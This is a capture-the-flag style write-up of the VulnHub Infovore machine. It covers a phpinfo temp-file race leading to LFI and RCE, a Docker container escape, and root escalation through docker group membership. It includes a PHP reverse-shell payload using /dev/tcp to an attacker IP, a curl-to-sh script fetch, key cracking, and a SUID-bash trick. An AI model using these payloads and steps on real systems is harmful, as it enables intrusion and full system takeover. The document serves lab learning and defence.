# VulnHub Infovore Machine Writeup

## Machine Information

- **Platform**: VulnHub
- **Machine Name**: Infovore
- **Target IP**: 192.168.40.49
- **Operating System**: Linux (Debian)
- **Difficulty**: Hard
- **Attack Vector**: PHP Temp File LFI + Docker Escape

## Executive Summary

This writeup documents the exploitation of the Infovore VulnHub machine, featuring advanced PHP LFI to RCE exploitation through phpinfo temp file inclusion, Docker container escape, and privilege escalation via Docker group membership. The attack demonstrated sophisticated techniques including race condition exploitation, SSH key extraction from compressed archives, and container privilege escalation through volume mounting.

## Reconnaissance

### Port Scanning

```bash
sudo nmap -sS -p- --open -n -Pn --min-rate 5000 192.168.40.49 -oN nmap/scan
```

![Port Scan Results](images/Pasted%20image%2020251012234711.png)

**Open Port**: 80 (HTTP)

### Service Enumeration

```bash
sudo nmap -sSCV -p80 -n -Pn 192.168.40.49 -oN nmap/vulnport
```

![Service Details](images/Pasted%20image%2020251012234929.png)

### HTTP Enumeration Script

```bash
sudo nmap --script http-enum -p80 -n -Pn 192.168.40.49 -oN nmap/vulnport
```

![HTTP Enumeration](images/Pasted%20image%2020251012235102.png)

**Critical Finding**: `info.php` file discovered.

### Technology Detection

```bash
whatweb http://192.168.40.49
```

**Output**:

```
http://192.168.40.49 [200 OK] Apache[2.4.38], Bootstrap, 
Country[RESERVED][ZZ], HTML5, HTTPServer[Debian Linux][Apache/2.4.38 (Debian)], 
IP[192.168.40.49], JQuery, PHP[7.4.7], Script, 
Title[Include me ...], X-Powered-By[PHP/7.4.7]
```

## PHP Info Analysis

### Information Disclosure

![PHP Info Page](images/Pasted%20image%2020251013003800.png)

**Key Findings**:

- No disabled functions
- File upload capabilities available
- PHP 7.4.7 running

## File Upload Exploitation

### Request Manipulation

Captured GET request to `info.php` and modified to POST with multipart form data:

![Request Modification](images/Pasted%20image%2020251013004259.png)

### File Upload POC

```http
POST /info.php HTTP/1.1
Host: 192.168.40.49
Content-Type: multipart/form-data; boundary=--pwned
Content-Length: 145

----pwned
Content-Disposition: form-data; name="name";filename="test.txt"
Content-Type: text/plain

Hola esto es una Prueba

----pwned
```

![Upload Success](images/Pasted%20image%2020251013010813.png)

**Result**: File successfully uploaded to server.

## LFI Parameter Discovery

### Parameter Fuzzing

```bash
wfuzz -c -t 200 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -u "http://192.168.40.49/index.php?FUZZ=/etc/passwd"
```

![Parameter Discovery](images/Pasted%20image%2020251013012957.png)

**Parameter Found**: `?filename=`

### LFI Verification

![LFI Test](images/Pasted%20image%2020251013012852.png)

**Result**: LFI vulnerability confirmed.

## PHP Temp File RCE

### Attack Methodology

Exploiting PHP temporary file handling with phpinfo:

**Technique**: Race condition to include temporary uploaded files before deletion.

**Process**:

1. Upload large POST request to phpinfo page
2. Extract temporary filename from phpinfo output
3. Include temp file via LFI before cleanup
4. Execute embedded PHP code

### Exploitation Script

Python script implementing the attack:

```python
#!/usr/bin/python 
import sys
import threading
import socket

def setup(host, port):
    TAG="Security Test"
    PAYLOAD="""%s\r
<?php system("bash -c 'bash -i >& /dev/tcp/192.168.40.22/443 0>&1'") ?>\r""" % TAG
    REQ1_DATA="""-----------------------------7dbff1ded0714\r
Content-Disposition: form-data; name="dummyname"; filename="test.txt"\r
Content-Type: text/plain\r
\r
%s
-----------------------------7dbff1ded0714--\r""" % PAYLOAD
    padding="A" * 5000
    REQ1="""POST /info.php?a="""+padding+""" HTTP/1.1\r
Cookie: PHPSESSID=q249llvfromc1or39t6tvnun42; othercookie="""+padding+"""\r
HTTP_ACCEPT: """ + padding + """\r
HTTP_USER_AGENT: """+padding+"""\r
HTTP_ACCEPT_LANGUAGE: """+padding+"""\r
HTTP_PRAGMA: """+padding+"""\r
Content-Type: multipart/form-data; boundary=---------------------------7dbff1ded0714\r
Content-Length: %s\r
Host: %s\r
\r
%s""" %(len(REQ1_DATA),host,REQ1_DATA)
    LFIREQ="""GET /index.php?filename=%s HTTP/1.1\r
User-Agent: Mozilla/4.0\r
Proxy-Connection: Keep-Alive\r
Host: %s\r
\r
\r
"""
    return (REQ1, TAG, LFIREQ)
```

### Execution

```bash
./python script.py 192.168.40.49 80
```

**Listener**:

```bash
sudo nc -nlvp 443
```

![Reverse Shell](images/Pasted%20image%2020251013015341.png)

**Result**: Reverse shell obtained as `www-data`.

## Container Detection

### Network Analysis

```bash
www-data@e71b67461f6c:/var/www/html$ hostname -I
192.168.150.21
```

**Discovery**: Different IP indicates Docker container environment.

## Container Analysis

### System Enumeration

```bash
curl -L https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh | sh
```

![Linpeas Discovery](images/Pasted%20image%2020251013020809.png)

**Finding**: Compressed archive `.oldkeys.tgz` in root directory.

### SSH Key Extraction

```bash
cp .oldkeys.tgz /tmp/oldkeys.tgz
tar -xf oldkeys.tgz
```

![SSH Keys](images/Pasted%20image%2020251013021121.png)

**Discovery**: Encrypted root SSH private key.

### Key Cracking

**Convert to John format**:

```bash
./python /usr/share/john/ssh2john.py id_rsa > hash
```

**Crack password**:

```bash
john -w:/usr/share/wordlists/rockyou.txt hash
```

**Password**: `choclate93`

### Root Access in Container

```bash
su root
# Password: choclate93
```

**Success**: Root access within Docker container.

### SSH Key Analysis

```bash
root@e71b67461f6c:~/.ssh# cat known_hosts
root@e71b67461f6c:~/.ssh# cat id_rsa.pub
```

**Discovery**: Admin user can SSH to host machine (192.168.150.1).

## Container Escape

### SSH to Host

```bash
ssh -i id_rsa admin@192.168.150.1
# Passphrase: choclate93
```

![Host Access](images/Pasted%20image%2020251013022934.png)

**Success**: Escaped container to actual host machine.

## Privilege Escalation

### Docker Group Membership

```bash
admin@infovore:~$ id
uid=1000(admin) gid=1000(admin) groups=1000(admin),999(docker)
```

**Critical Finding**: User is member of Docker group.

### Container Privilege Escalation

**Create privileged container with root filesystem mounted**:

```bash
docker run -dit -v /:/mnt/root --name privesc theart42/infovore
```

**Access container**:

```bash
docker exec -it privesc bash
```

**Modify host bash binary**:

```bash
cd /mnt/root/bin
chmod u+s bash
exit
```

### Root Access

```bash
bash -p
```

![Root Shell](images/Pasted%20image%2020251013024143.png)

**Result**: Root privileges achieved on host machine.

## Technical Analysis

### Vulnerability Chain

1. **PHP Info Disclosure** → Revealed upload capabilities
2. **Race Condition** → Temp file inclusion before deletion
3. **LFI to RCE** → Executed PHP code via temp file
4. **Container Detection** → Identified Docker environment
5. **SSH Key Discovery** → Found encrypted private key
6. **Password Cracking** → Obtained SSH passphrase
7. **Container Escape** → SSH to host machine
8. **Docker Group Abuse** → Volume mounting for privilege escalation

### Key Vulnerabilities

- **PHP Temp File Race**: Exploitable phpinfo with LFI
- **Weak SSH Encryption**: Crackable passphrase
- **Docker Group Membership**: Unrestricted container creation
- **Volume Mounting**: Full filesystem access from container

### Advanced Techniques

- **Race Condition Exploitation**: Threading to win temp file race
- **Container Escape**: SSH from container to host
- **Privilege Escalation**: SetUID manipulation via Docker volumes
- **Archive Analysis**: SSH key extraction from compressed files

## Key Lessons

1. **PHP Info Security**: Never expose phpinfo on production systems
2. **Temp File Handling**: Race conditions in file cleanup can be exploited
3. **Docker Security**: Group membership grants root-equivalent access
4. **SSH Key Management**: Use strong passphrases and secure storage
5. **Container Isolation**: Limit volume mounting capabilities

## Conclusion

The VulnHub Infovore machine demonstrated advanced exploitation techniques combining web application vulnerabilities with container security weaknesses. The machine effectively showcased realistic scenarios including PHP race condition exploitation, Docker container escape, and privilege escalation through volume mounting. This exercise emphasized the critical importance of proper Docker security configuration and the risks associated with unrestricted container access.
